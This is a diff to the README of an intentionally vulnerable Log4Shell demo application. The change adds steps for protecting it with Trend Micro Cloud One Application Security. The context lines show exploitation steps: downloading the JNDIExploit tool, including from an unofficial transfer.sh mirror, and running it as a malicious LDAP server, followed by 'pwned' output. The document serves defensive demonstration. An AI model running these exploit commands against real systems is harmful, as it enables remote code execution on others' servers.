@@ -1,6 +1,6 @@
-# Log4Shell sample vulnerable application (CVE-2021-44228)
+# Log4Shell sample vulnerable application (CVE-2021-44228), protected by Cloud One Application Security
 
-This repository contains a Spring Boot web application vulnerable to CVE-2021-44228, nicknamed [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).
+This repository contains a Spring Boot web application vulnerable to CVE-2021-44228, nicknamed [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/), and was modified to add Trend Micro's Cloud One Application Security agent to demonstrate technique-based web application protection to this vulnerability.
 
 It uses Log4j 2.14.1 (through `spring-boot-starter-log4j2` 2.6.1) and the JDK 1.8.0_181.
 
@@ -22,7 +22,7 @@ docker run --rm -d -p 8080:8080 --name log4shell-vulnerable-app-c1as log4shell-v
 * Use [JNDIExploit](https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) to spin up a malicious LDAP server
 
 ```bash
-wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
+wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip #(looks down, try https://transfer.sh/puxohI/JNDIExploit.v1.2.zip)
 unzip JNDIExploit.v1.2.zip
 nohup java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888 &
 ```
@@ -59,10 +59,26 @@ pwned
 ...
 ```
 
+## Protection with Cloud One Application Security
+
+This assumes you have (already integrated the agent to your application.) [https://cloudone.trendmicro.com/docs/application-security/install-agent/]
+
+1. Log into Trend Micro Cloud One and navigate to Application Security.
+2. Select "Group's Policy" on the left-hand menu and find your application's Group.
+3. Enable "Remote Command Execution" if not already enabled.
+4. Click the hamburger icon for "Configure Policy" and then click the " < INSERT RULE > " icon.
+5. Input ```(?s).*``` in the "Enter a pattern to match" field and hit "Submit" and "Save Changes."
+6. Double-check that "Mitigate" is selected in your "Remote Command Execution" line item.
+
+
+
 ## Reference
 
 https://www.lunasec.io/docs/blog/log4j-zero-day/
 https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/
+https://success.trendmicro.com/solution/000289940
+https://www.trendmicro.com/en_us/research/21/l/patch-now-apache-log4j-vulnerability-called-log4shell-being-acti.html
+
 
 ## Contributors
 
